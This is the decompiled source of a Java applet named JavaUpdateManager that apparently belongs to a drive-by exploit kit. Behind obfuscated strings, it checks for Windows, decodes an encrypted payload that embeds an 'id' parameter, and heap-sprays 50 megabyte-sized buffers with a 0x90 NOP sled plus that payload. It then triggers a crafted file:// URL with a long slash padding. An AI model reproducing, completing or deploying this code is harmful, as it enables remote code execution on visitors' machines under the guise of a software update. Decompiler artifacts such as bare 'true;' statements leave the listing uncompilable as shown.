import java.net.URL;
import java.nio.IntBuffer;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class JavaUpdateManager extends Applet
{
    private IntBuffer[] __e;
    
    public static String __U(final String s, final String s2, final String s3) {
        String string = "";
        false;
        for (int i = 0; i < s.length(); ++i) {
            final int index = s2.indexOf(s.substring(i, i + 1));
            if (index > -1) {
                string += s3.substring(index, index + 1);
            }
        }
        return string;
    }
    
    @Override
    public void init() {
        true;
        final String repeat = repeat('/', 302);
        final String lowerCase = System.getProperty("o8.7a63".replace("8", "s").replace("7", "n").replace("6", "m").replace("3", "e")).toLowerCase();
        false;
        if (lowerCase.indexOf("1i2".replace("2", "n").replace("1", "w")) < 0) {
            return;
        }
        final StringBuilder sb = new StringBuilder();
        sb.append("1357://".replace("7", "e").replace("5", "l").replace("1", "f").replace("3", "i"));
        true;
        sb.append(repeat);
        sb.append("3%3%3%3%3%3%".replace("3", "Z"));
        false;
        final String string = sb.toString();
        try {
            final String _v = this.__v();
            false;
            this.__e = this.__P(_v, "10101010".replace("1", "9"));
            JavaUpdateApplication.__C(new URL(string));
            false;
            false;
            final long n = 10L;
            while (true) {
                Thread.sleep(n);
                false;
            }
        }
        catch (Exception ex) {}
    }
    
    public static String __c(final String s) {
        final int length = s.length();
        final StringBuffer sb = new StringBuffer(length);
        for (int i = length - 1; i >= 0; --i) {
            sb.append(s.charAt(i));
        }
        return sb.toString();
    }
    
    public String __v() {
        final String s = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/.:_-?&=%#";
        false;
        final String s2 = "5Vba&?DLH%u4SY#stJ2=-_0Moj/z39nT.heU8Xc7lZOFgQIp61RCEqPKBfmyGWwikxvNrA:d";
        final String _u = __U("?5?a?V?b?D?L??%clH55555555?7Hal757aVc5D&5a&5a5LH5cHX&55cHXL5Vc87HX&55HlX5%HX&5a&H7&5LcHX&5ac?D?LXl?l5V55555VllXZ&l5V55555VlZlH7D5V5555?Z?lH%l8HVcb?l5V5555?bDHH5555555ZZ%?&l5V5555H%l8HVcb?l5V5555aVZD5VcbH8%ca?Da5b5555H5ZX55L&5DHHVcab&DlXllcD5&ab55H%l8HVcb&?5b5555?bZZ%??b5V5555H%l8HVcb?55b5555?b?5ZZ%??D5V5555D855D855H%l8HVcb?l5V5555?bH%l8HVcbLH5b5555?bD855ZZ75D85?H%l8HVcb?l5V5555?bZZ%??85V5555H%l8HVcb?l5V5555?bDHH5555555ZZ%?&l5V5555H%l8HVcb?l5V5555aVZD5VcbH8%ca?Dl5b5555H5ZX55L&5DHHVcab&DlXllcD5&ab55H%l8HVcb&?5b5555?bZZ%??b5V5555H%l8HVcb?55b5555?b?5ZZ%??D5V5555D855D855H%l8HVcb?l5V5555?bH%l8HVcb8D5b5555?bD855ZZ75D85?H%l8HVcb?l5V5555?bZZ%??85V5555%7?7?Z?l?8?%?X?Hca55555555555555555555555555555555&LD?L&?&D?D7L5?5DVL&DH&V55&cDZDVD&&cD%DbLbDVLbL%&V55&LD?L&?5LbDZDa&VD&D&LbD?LaLa55?LD%Dl&?LHD?Da55XXH%ZbH%ZLa5c58lL?Z7b%ZLH%Z%aVc5Xlac5555555aX?VX5b5555DD875aH?VX5b5555HXL5LHHacDVc5aX?VX5b5555H7X7VZ5b5555875aH?VX5b55558X875aH?VX5b5555?58X875aH?VX5b55558X?laV7X87?D5aH?VX5b5555H%cDH%7L?VZcZa8D?%L&5&?l&alXl%?l%a7Vl55aH?bL5b5555aVZD%DDD87cVl55b5aH?VZ5b5555H%cD875aH?VX5b5555calXV555555555555555555555555555555555H%H?VX5b5555?D?LlH?HZZZZZZ?Z?l8X5VclH5alXXL&5blXl7ca???b&c&7&Z&lbl&&&c&c55???b&c&&DZLLDlDcDZDVD&?&DZ&DD%DcD?&V55L5D&DDL?L5D&blD?LHD?55DaLbDVLaDHblL5DHL555", s2, s);
        final String s3 = "0090";
        final String parameter = this.getParameter("id");
        false;
        final String _u2 = __U(parameter, s2, s);
        true;
        false;
        final StringBuilder sb = new StringBuilder();
        sb.append(_u);
        sb.append(_u2);
        true;
        sb.append(s3);
        final String string = sb.toString();
        true;
        return string;
    }
    
    public static String repeat(final char c, final int n) {
        true;
        String string = "";
        for (int i = 0; i < n; ++i) {
            string += c;
        }
        false;
        return string;
    }
    
    public static short[] __a(final String s) {
        false;
        final short[] array = new short[s.length() / 2];
        for (int i = 0; i < s.length(); i += 2) {
            final char char1 = s.charAt(i);
            final char char2 = s.charAt(i + 1);
            final int n = (Character.digit(char1, 16) & 0xFF) << 4;
            true;
            array[i / 2] = (short)(n + (Character.digit(char2, 16) & 0xFF));
            true;
        }
        false;
        return array;
    }
    
    public final IntBuffer[] __P(final String s, final String s2) {
        true;
        final short[] _a = __a(s);
        final short[] _a2 = __a(s2);
        true;
        return this.__P(_a, _a2);
    }
    
    public final IntBuffer[] __P(final short[] array, final short[] array2) {
        true;
        final int n = 50;
        final int n2 = 1048576;
        final int n3 = n2 / 4 - array.length;
        final IntBuffer[] array3 = new IntBuffer[n];
        false;
        true;
        true;
        for (int i = 0; i < n; ++i) {
            false;
            final IntBuffer allocate = IntBuffer.allocate(n2 / 4);
            for (int j = 0; j < n3; ++j) {
                false;
                allocate.put(array2[0] | array2[1] << 8 | array2[2] << 16 | array2[3] << 24);
            }
            int k = 0;
            while (k < array.length) {
                true;
                allocate.put(array[k++] | array[k++] << 8 | array[k++] << 16 | array[k++] << 24);
            }
            array3[i] = allocate;
        }
        false;
        return array3;
    }
}
